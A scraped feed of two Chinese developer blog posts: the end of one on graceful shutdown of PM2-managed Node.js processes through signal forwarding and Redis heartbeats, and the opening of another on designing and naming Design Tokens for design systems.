<pre><code class="hljs language-bash" lang="bash">73353     1 PM2 v6.0.8: God  PM2 v6.0.8: God Daemon (/Users/czy/.pm2) 
73354 73353 node /Users/czy/ node /xxx/graceful-shutdown/dist/index.js 
73355 73353 node /Users/czy/ node /xxx/graceful-shutdown/dist/index.js 
</code></pre>
<p>在这种情况下，如果需要尝试优雅停机处理，那么就需要主动将信号传递到子进程中。通常来说由于进程结束，我们无法从主进程中得到子进程的<code>PID</code>，因此只能通过<code>pm2</code>提供的命令来获取子进程的<code>PID</code>，或者直接使用<code>ps</code>来匹配<code>PID</code>，然后再发送信号，这种情况下是可以优雅停机的。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">kill</span> -INT $(pgrep pm2)
</code></pre>
<p>因此，我们可以组合上面的脚本来实现信号的传递处理，首先需要避免主进程脚本结束掉，因此需要使用<code>while</code>来保持进程，然后在收到信号时获取子进程的<code>PID</code>并且传递信号。注意这种情况下不能用<code>exec</code>了，需要正常<code>fork</code>出子进程，否则后续<code>while</code>以及<code>trap</code>代码不会执行。</p>
<pre><code class="hljs language-bash" lang="bash">pm2 start ./dist/index.js -i 2 --kill-timeout 5000 --log-date-format=<span class="hljs-string">"YYYY-MM-DD HH:mm:ss"</span> --<span class="hljs-built_in">log</span> ./output.log
<span class="hljs-function"><span class="hljs-title">forward_signal</span></span>() {
    pm2_pid=$(pgrep pm2)
    <span class="hljs-built_in">kill</span> -INT <span class="hljs-variable">$pm2_pid</span>
    <span class="hljs-built_in">exit</span> 0
}
<span class="hljs-built_in">trap</span> forward_signal SIGINT
<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">sleep</span> 1
<span class="hljs-keyword">done</span>
</code></pre>
<pre><code class="hljs language-bash" lang="bash">bootstrap.sh PID-PPID 76699,73203
76731     1 PM2 v6.0.8: God  PM2 v6.0.8: God Daemon (/Users/czy/.pm2) 
76732 76731 node /Users/czy/ node /xxx/graceful-shutdown/dist/index.js 
76733 76731 node /Users/czy/ node /xxx/graceful-shutdown/dist/index.js 
73203 51513 /bin/zsh         /bin/zsh -il
76699 73203 bash             bash bootstrap.sh
76895 76699 <span class="hljs-built_in">sleep</span>            <span class="hljs-built_in">sleep</span> 1
</code></pre>
<p>实际上，<code>pm2</code>当前支持了<code>pm2-runtime</code>命令来更好地支持容器化场景下的进程管理，同样的之前叙述的<code>npx</code>命令问题也会出现。从下面的进程树中可以看出来信号传递会比之前多了一层，而执行<code>kill -INT 80795</code>命令时，子进程是无法收到信号的，进程也不会结束。</p>
<pre><code class="hljs language-bash" lang="bash">78367 51513 /bin/zsh         /bin/zsh -il
80795 78367 bash             bash bootstrap.sh
80819 80795 npm <span class="hljs-built_in">exec</span> pm2-run npm <span class="hljs-built_in">exec</span> pm2-runtime start pm2.config.js --<span class="hljs-built_in">env</span> production      
80836 80819 node             node /xxx/.bin/../pm2/bin/pm2-runtime start pm2.config.js --<span class="hljs-built_in">env</span> production
80844 80836 node /Users/czy/ node /xxx/graceful-shutdown/dist/index.js     
80845 80836 node /Users/czy/ node /xxx/graceful-shutdown/dist/index.js 
</code></pre>
<p>因此这里的实现仍然需要保证使用<code>exec</code>来启动<code>pm2-runtime</code>服务，此外该命令不会启动<code>pm2</code>的守护进程，相关日志会直接输出到当前<code>shell</code>中。而且也是支持集群模式的，下面的例子展示了使用<code>pm2-runtime</code>启动的进程关系树，执行<code>kill -INT 84685</code>可以正常处理信号。</p>
<pre><code class="hljs language-bash" lang="bash">78367 51513 /bin/zsh         /bin/zsh -il
78673 78367 node             node /xxx/.bin/../pm2/bin/pm2-runtime start pm2.config.js --<span class="hljs-built_in">env</span> production
78704 78673 node /Users/czy/ node /xxx/graceful-shutdown/dist/index.js     
78705 78673 node /Users/czy/ node /xxx/graceful-shutdown/dist/index.js
</code></pre>
<h3 data-id="heading-10">心跳机制</h3>
<p>在分布式环境下，除了信号传递的问题之外，还有一个问题就是进程本身的存活检测问题。假设某个实例由于某些原因直接退出了，那么此时就无法进行优雅停机处理了，因此我们需要通过心跳机制来检测进程的存活状态，以此来维护服务本身的健壮性。</p>
<p>心跳机制的实现其实非常简单，主要是通过定时向存储位置写入当前的时间戳来表示进程的存活状态。假设我们使用<code>Redis</code>来存储心跳时间戳，那么每个实例可以使用唯一的<code>key</code>来存储自己的心跳时间戳，然后定时更新这个时间戳。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">launchInstance</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">keep</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 更新 Redis 心跳时间戳</span>
    <span class="hljs-built_in">setTimeout</span>(keep, <span class="hljs-variable constant_">LOOP_TIME</span>);
  };
  <span class="hljs-title function_">keep</span>();
  <span class="hljs-comment">// 开机时清理一次过期实例</span>
  <span class="hljs-keyword">const</span> res = <span class="hljs-title function_">clearInactiveInstances</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Active Instance"</span>, res.<span class="hljs-property">active</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Inactive Instance"</span>, res.<span class="hljs-property">inactive</span>);
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">terminateInstance</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 优雅停机时删除当前实例</span>
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearInactiveInstances</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> entries = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(<span class="hljs-variable constant_">MEMORY_MAP</span>);
  <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
  <span class="hljs-keyword">const</span> <span class="hljs-attr">active</span>: string[] = [];
  <span class="hljs-keyword">const</span> <span class="hljs-attr">inactive</span>: string[] = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> entries) {
    <span class="hljs-keyword">if</span> (now - <span class="hljs-title class_">Number</span>(value) &gt; <span class="hljs-variable constant_">ACTIVE_TIME_OUT</span>) {
      <span class="hljs-comment">// 清理过期实例</span>
      inactive.<span class="hljs-title function_">push</span>(key);
      <span class="hljs-keyword">continue</span>;
    }
    active.<span class="hljs-title function_">push</span>(key);
  }
  <span class="hljs-keyword">return</span> { active, inactive };
};
</code></pre>
<p>由于实例本身如果退出了，那么心跳时间戳就不会再更新了，而且守护进程的存在，退出的进程会在一段时间内重启。那么在业务中，例如我们最开始聊的任务队列实现中，我们就可以在实例启动的时获取当前的活跃实例，然后检查正在运行任务的调度实例<code>id</code>是否还在活跃实例中，以此来尝试重新调度任务。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// task</span>
{
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">pod_id</span>: <span class="hljs-string">"$instance_id0"</span>,
  <span class="hljs-attr">status</span>: <span class="hljs-string">"running"</span>
}

<span class="hljs-comment">// redis</span>
[
  <span class="hljs-string">"$instance_id0"</span>: <span class="hljs-number">100</span>,
  <span class="hljs-string">"$instance_id1"</span>: <span class="hljs-number">9999999999</span>,
  <span class="hljs-string">"$instance_id2"</span>: <span class="hljs-number">9999999999</span>
]
</code></pre>
<h2 data-id="heading-11">总结</h2>
<p>在文本中我们实现了一个简单的分布式任务队列，并且实现了优雅停机的处理。任务队列主要是通过分布式锁来限制并发数，从而保证任务能够被合理地调度执行，从而实现长任务的异步调度机制，并且实现任务的流量削峰、错误重试等。</p>
<p>优雅停机的处理主要是通过信号传递来实现的，从而保证进程能够在收到停机信号时进行资源的清理和任务的完成，避免任务的中断和数据的不一致问题。此外还叙述了父子进程间的信号传递，以及实现心跳机制来检测实例的存活状态，从而保证分布式环境下的服务健壮性。</p>
<h2 data-id="heading-12">每日一题</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWindRunnerMax%2FEveryDay" target="_blank" title="https://github.com/WindRunnerMax/EveryDay" ref="nofollow noopener noreferrer">github.com/WindRunnerM…</a></li>
</ul>
<h2 data-id="heading-13">参考</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.nestjs.com%2Fmodules" target="_blank" title="https://docs.nestjs.com/modules" ref="nofollow noopener noreferrer">docs.nestjs.com/modules</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fpm2.keymetrics.io%2Fdocs%2Fusage%2Fdocker-pm2-nodejs%2F" target="_blank" title="https://pm2.keymetrics.io/docs/usage/docker-pm2-nodejs/" ref="nofollow noopener noreferrer">pm2.keymetrics.io/docs/usage/…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fpm2.keymetrics.io%2Fdocs%2Fusage%2Fsignals-clean-restart%2F" target="_blank" title="https://pm2.keymetrics.io/docs/usage/signals-clean-restart/" ref="nofollow noopener noreferrer">pm2.keymetrics.io/docs/usage/…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Design Tokens的设计与使用详解：构建高效设计系统的核心技术]]></title>    <link>https://juejin.cn/post/7575438636332286003</link>    <guid>https://juejin.cn/post/7575438636332286003</guid>    <pubDate>2025-11-24T02:13:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575438636332286003" data-draft-id="7575469988737368073" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Design Tokens的设计与使用详解：构建高效设计系统的核心技术"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-24T02:13:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一名普通的程序员"/> <meta itemprop="url" content="https://juejin.cn/user/3913917126936087"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Design Tokens的设计与使用详解：构建高效设计系统的核心技术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3913917126936087/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一名普通的程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:13:28.000Z" title="Mon Nov 24 2025 02:13:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>Design Tokens是现代设计系统中的关键抽象层，它们将视觉设计元素转化为可管理的变量，使设计与开发能够无缝协作并实现一致的用户体验</strong>。作为设计与开发的桥梁，Design Tokens不仅提高了工作效率，还确保了产品在不同平台和场景下的视觉一致性。本文将深入解析Design Tokens的设计理念、分类体系、命名规则及实施流程，帮助设计师和开发者建立完整的设计系统工作流。</p>
<h3 data-id="heading-0">一、Design Tokens的基本概念与核心价值</h3>
<p>Design Tokens的概念最早由Salesforce的设计团队在2014年提出，其名称来源于设计师Jina Anne  。<strong>简单来说，Design Tokens是设计系统中的视觉设计原子，是一组有着统一命名规则的实体，用于存储视觉设计部分的具体参数</strong>，如HEX色值、间距、尺寸、字体等  。它们可以理解为设计师和开发人员共同认可的"外号"，通过这些外号而非具体的数值来引用视觉样式  。</p>
<p>Design Tokens的核心价值体现在以下几个方面：</p>
<p>首先，<strong>Design Tokens确保了设计与开发的一致性</strong>。在传统设计流程中，设计师在设计软件中使用特定样式，而开发人员则需要手动将这些样式转换为代码，容易出现偏差和不一致。通过Design Tokens，设计师和开发人员可以使用相同的命名规则和参数值，减少沟通成本和实现偏差。</p>
<p>其次，<strong>Design Tokens大幅提升了开发效率</strong>。当品牌色或设计规范需要调整时，传统的做法需要修改大量代码，工作量巨大且容易出错。而使用Design Tokens后，只需修改一次Token值，所有引用该Token的组件都会自动更新  。例如，当品牌主色从#00704a变更为#007BFF时，只需在Token中修改一次，整个应用的按钮、图标、文本等元素都会同步更新，无需逐个修改。</p>
<p>第三，<strong>Design Tokens支持动态主题和多品牌场景</strong>。通过分层管理和条件赋值，可以轻松实现明暗模式切换、品牌定制等需求  。例如，在暗色模式下，危险色Token的值可以自动从#FF4444切换为#FF6B6B，而开发人员无需编写额外逻辑。</p>
<p>最后，<strong>Design Tokens降低了维护成本</strong>。随着产品迭代和业务扩展，设计系统需要不断更新。Design Tokens提供了一种结构化的管理方式，使维护和迭代更加可控  。设计师可以专注于设计创新，而开发人员则可以专注于实现逻辑，双方都能在各自领域高效工作。</p>
<h3 data-id="heading-1">二、Design Tokens的分类体系与核心属性</h3>
<p>Design Tokens的分类体系通常基于视觉设计的原子化原则，将复杂的UI元素分解为可复用的基础组件。<strong>主要分类包括颜色系统、排版系统、间距与尺寸、特殊属性等</strong>，每种分类下又有更细的子类  。</p>
<p>颜色系统是Design Tokens中最基础也是最重要的部分。一个完整的设计系统通常包含<strong>基础色和功能色两大部分</strong>：</p>
<p>基础色通常采用色相-明度的分级体系，如Semi Design的16个色相，每个色相包含10个明度等级，从0（最浅）到9（最深）  。例如红色系列可以定义为：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attr">--semi-red-0</span> : <span class="hljs-number">249</span>, <span class="hljs-number">57</span>, <span class="hljs-number">32</span>;  // 浅红色
<span class="hljs-attr">--semi-red-9</span> : <span class="hljs-number">199</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>;    // 深红色
</code></pre>
<p>功能色则基于特定场景和用途进行定义，如品牌主色、成功色、错误色、警告色等  。这些功能色可以基于基础色进行衍生，例如：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">color</span>-primary: <span class="hljs-built_in">var</span>(--semi-blue-<span class="hljs-number">5</span>);  // 品牌主色
<span class="hljs-attribute">color</span>-error: <span class="hljs-built_in">var</span>(--semi-red-<span class="hljs-number">5</span>);     // 错误颜色
</code></pre>
<p>排版系统主要包含字号、字重和字体家族等属性。一个典型的排版系统可能定义5级字号（如12px到32px）和3种字重（轻、常规、粗）  ：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">font-size</span> small: <span class="hljs-number">12px</span>;    // 辅助文本
<span class="hljs-attribute">font-size</span> regular: <span class="hljs-number">14px</span>;  // 正文
<span class="hljs-attribute">font-size</span> <span class="hljs-selector-tag">header</span>-<span class="hljs-number">6</span>: <span class="hljs-number">16px</span>; // 小标题
<span class="hljs-attribute">font-weight</span> bold: <span class="hljs-number">600</span>;     // 强调文本
</code></pre>
<p>间距与尺寸系统则定义了UI元素之间的间距和标准尺寸，通常采用8级间距体系（如2px到40px）和3种控件高度  ：</p>
<pre><code class="hljs language-arduino" lang="arduino">spacing-extra-tight: <span class="hljs-number">4</span>px;  <span class="hljs-comment">// 紧凑内边距</span>
spacing-base: <span class="hljs-number">16</span>px;        <span class="hljs-comment">// 默认间距</span>
height-control-<span class="hljs-keyword">default</span>: <span class="hljs-number">32</span>px;  <span class="hljs-comment">// 按钮/输入框默认高度</span>
</code></pre>
<p>特殊属性包括z-index层级、投影效果、阴影等级、动画曲线等，这些属性对于复杂UI的呈现至关重要  ：</p>
<pre><code class="hljs language-arduino" lang="arduino">z-modal: <span class="hljs-number">1000</span>;       <span class="hljs-comment">// 模态框层级</span>
z-tooltip: <span class="hljs-number">1060</span>;     <span class="hljs-comment">// 提示框层级（高于模态框）</span>
shadow-low: <span class="hljs-number">0</span> <span class="hljs-number">2</span>px <span class="hljs-number">4</span><span class="hljs-function">px <span class="hljs-title">rgba</span><span class="hljs-params">(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.01</span>)</span></span>;  <span class="hljs-comment">// 较低的阴影</span>
shadow-high: <span class="hljs-number">0</span> <span class="hljs-number">8</span>px <span class="hljs-number">16</span><span class="hljs-function">px <span class="hljs-title">rgba</span><span class="hljs-params">(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>)</span></span>;  <span class="hljs-comment">// 较高的阴影</span>
</code></pre>
<p><strong>Design Tokens的精髓在于将共性特征/属性变成可操控的变量</strong>  。例如，多个组件的圆角可能都是4px，且这些圆角都用于组件的背景层，那么它们可以绑定和使用同一个圆角Token，如<code>corner-background-small</code>。当需要将这5个组件的圆角都改为8px时，只需修改一次Token值，所有相关组件都会自动更新  。</p>
<h3 data-id="heading-2">三、命名规则的设计原则与最佳实践</h3>
<p>Design Tokens的命名规则是确保设计与开发协作顺畅的关键。<strong>良好的命名规则应当遵循语义化、一致性、可读性和分层结构等原则</strong>  。</p>
<p>语义化原则要求Token名称能够清晰表达其用途和上下文。例如，<code>color-button-background-primary-normal</code>比简单的<code>color-1</code>更有意义，能够明确表示这是一个按钮的主状态背景色  。这种命名方式使得设计师和开发者都能直观理解Token的用途，减少沟通成本。</p>
<p>一致性原则要求整个设计系统中Token的命名风格保持统一。这包括使用相同的分隔符（如横线）、相同的命名层级（如"分类-场景-状态"）以及相同的术语  。例如，所有颜色Token都应使用<code>color-</code>前缀，所有间距Token都应使用<code>spacing-</code>前缀，保持命名的一致性。</p>
<p>可读性原则要求Token名称应当简洁明了，避免过长或过于复杂的命名。同时，名称应当使用英文，因为这是设计与开发协作的通用语言  。例如，<code>button-bg-color</code>比<code>btn背景色</code>更合适，因为它使用英文且简洁。</p>
<p>分层结构原则要求Token名称能够反映其在设计系统中的层级关系。通常采用三级结构：基础Token（原始值）、语义Token（用途说明）和组件Token（组件级变量）  。例如：</p>
<pre><code class="hljs language-css" lang="css">// 基础Token
<span class="hljs-attr">--semi-blue-5</span>: <span class="hljs-number">#00704a</span>;

// 语义Token
<span class="hljs-attribute">color</span>-brand-default: <span class="hljs-built_in">var</span>(--semi-blue-<span class="hljs-number">5</span>);

// 组件Token
<span class="hljs-selector-tag">button</span>-bg-<span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(color-brand-default);
</code></pre>
<p>这种分层结构使得设计系统更加灵活和可扩展。基础Token是设计系统的底层元素，语义Token则赋予这些基础元素具体的用途，组件Token则将这些语义Token应用到具体的组件中。</p>
<p>在实际应用中，<strong>Token命名通常采用"分类-场景-状态"模式</strong>  。例如：</p>
<ul>
<li>颜色Token：<code>color-button-background-primary-normal</code></li>
<li>字体Token：<code>font-size-text regular</code></li>
<li>圆角Token：<code>corner-background-small</code></li>
</ul>
<p>这种命名方式能够清晰表达Token的分类、应用场景和状态，使设计师和开发者都能快速理解Token的用途。</p>
<p>对于复杂的项目，<strong>可以采用"套娃"结构，即基础Token与组件Token的关联</strong>  。例如，登录按钮的背景色可以定义为<code>login-button-bg</code>，而这个Token可以引用基础品牌色<code>brand-color-1</code>：</p>
<pre><code class="hljs language-css" lang="css">login-<span class="hljs-selector-tag">button</span>-bg: <span class="hljs-built_in">var</span>(brand-color-<span class="hljs-number">1</span>);
</code></pre>
<p>这样，当品牌色需要调整时，只需修改<code>brand-color-1</code>的值，所有引用它的组件Token都会自动更新，保持设计的一致性。</p>
<h3 data-id="heading-3">四、从设计到开发的完整实施流程</h3>
<p>实施Design Tokens需要设计团队和开发团队的紧密协作，通常分为以下几个阶段：</p>
<p>首先，<strong>在设计阶段，需要从设计规范中提取视觉元素并定义基础Token</strong>  。设计师应当与开发人员共同参与这一过程，确保双方对Token的定义和用途有共同理解。提取的视觉元素包括颜色、字体、间距、圆角、阴影等基础设计元素  。例如，从设计规范中提取所有按钮的背景色、边框颜色、文字颜色等，并为这些颜色定义基础Token。</p>
<p>然后，<strong>在设计工具中建立Token管理系统</strong>  。设计师可以使用Sketch、Figma等设计工具的样式库功能，将提取的视觉元素转化为Token，并按照分类、场景和状态进行组织  。例如，在Figma中创建颜色、字体、间距等分类，每个分类下再按场景和状态组织Token。同时，设计师应当将Token记录在表格中，包括Token名称、中文名、值和应用场景等信息，便于开发人员理解和使用  。</p>
<p>接下来，<strong>使用工具链将设计Token转换为开发代码</strong>  。开发人员可以使用Style Dictionary、Theo等工具，将设计Token导出为不同平台和格式的代码  。例如，将Token导出为CSS变量、SCSS变量、JSON文件或React Context等格式，供前端开发使用  。一个典型的Token转换过程如下：</p>
<pre><code class="hljs language-css" lang="css">// 设计Token
<span class="hljs-attribute">color</span>-<span class="hljs-selector-tag">button</span>-<span class="hljs-attribute">background</span>-primary-<span class="hljs-attribute">normal</span>: <span class="hljs-number">#00704a</span>;

// 转换为CSS变量
<span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-attr">--color-button-background-primary-normal</span>: <span class="hljs-number">#00704a</span>;
}

// 转换为SCSS变量
$<span class="hljs-attribute">color</span>-<span class="hljs-selector-tag">button</span>-<span class="hljs-attribute">background</span>-primary-<span class="hljs-attribute">normal</span>: <span class="hljs-number">#00704a</span>;
</code></pre>
<p>在开发阶段，<strong>将Token集成到组件库和主题系统中</strong>  。前端开发人员应当将转换后的Token应用到组件的样式中，确保所有组件都使用Token而非硬编码的值  。同时，应当建立主题系统，通过条件赋值实现不同主题（如明暗模式）的切换  。例如，Semi Design的实现方式：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 明模式危险色定义 */</span>
<span class="hljs-attr">--semi-red-5</span> : <span class="hljs-number">249</span>, <span class="hljs-number">57</span>, <span class="hljs-number">32</span>;

<span class="hljs-comment">/* 暗模式危险色自动反转 */</span>
<span class="hljs-attr">--semi-red-5</span> : <span class="hljs-number">252</span>, <span class="hljs-number">114</span>, <span class="hljs-number">90</span>;
</code></pre>
<p>最后，<strong>建立Token的维护和迭代机制</strong>  。Design Tokens不是一成不变的，随着产品迭代和业务需求变化，需要不断更新和扩展。因此，应当建立Token的维护机制，包括版本控制、变更通知和文档更新等  。例如，可以使用语义化版本规范管理Token仓库，通过npm包发布更新，并建立完善的文档系统记录Token的定义和用途  。</p>
<h3 data-id="heading-4">五、Design Tokens的实施工具与最佳实践</h3>
<p>实施Design Tokens需要一系列工具支持，包括设计工具、转换工具和开发工具等。</p>
<p>在设计工具方面，Figma、Sketch和Adobe XD等主流工具都支持Token管理。<strong>Figma的插件生态系统提供了多种Token管理解决方案</strong>，如Tokens Studio、Token Manager等，可以将设计Token导出为JSON或CSS变量格式。例如，使用Tokens Studio插件可以快速导出设计Token，并与开发团队共享。</p>
<p>在转换工具方面，<strong>Style Dictionary和Theo是两个最常用的设计系统转换工具</strong>  。Style Dictionary可以将设计Token从JSON格式转换为多种开发格式，如CSS、SCSS、Less、React Context等。Theo（由Salesforce开发）则专注于CSS变量的生成和管理，支持主题切换和动态更新。这些工具大大简化了设计到开发的转换过程，提高了工作效率。</p>
<p>在开发工具方面，<strong>现代前端框架都支持Token的集成和使用</strong>。例如，在React中可以使用Context API管理主题Token；在Vue中可以使用提供/注入（provide/inject）机制；在Flutter中则可以使用主题（Theme）和主题数据（ThemeData）来管理Token。同时，CSS变量（Custom Properties）是实现动态主题和跨平台一致性的核心技术，应当充分利用。</p>
<p>实施Design Tokens的最佳实践包括：</p>
<p><strong>建立跨职能团队</strong>：设计、开发和产品团队应当共同参与Design Tokens的设计和实施，确保各方需求都被考虑  。设计师负责定义视觉元素，开发人员负责技术实现，产品团队则提供业务场景和需求洞察。</p>
<p><strong>采用渐进式实施策略</strong>：对于大型项目，可以采用渐进式策略，先从核心组件和高频使用的设计元素开始，逐步扩展到整个设计系统  。例如，先定义颜色和字体Token，再逐步添加间距、圆角、阴影等其他Token。</p>
